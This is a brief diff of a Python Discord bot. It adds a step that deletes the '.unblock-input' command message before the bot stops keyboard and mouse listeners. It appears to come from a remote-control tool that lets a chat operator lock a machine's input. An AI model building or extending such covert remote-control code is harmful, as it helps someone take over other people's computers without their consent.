@@ -27,6 +27,7 @@ elif message.content == '.block-input':
     await message.channel.send(embed=embed)
 
 elif message.content == '.unblock-input':
+    await message.delete()
     keyboard_listener.stop()
     mouse_listener.stop()
     embed = discord.Embed(title="🚫 Input Unblocked",description=f'```Input has been unblocked. Block it by using .block-input```', colour=0x013220)
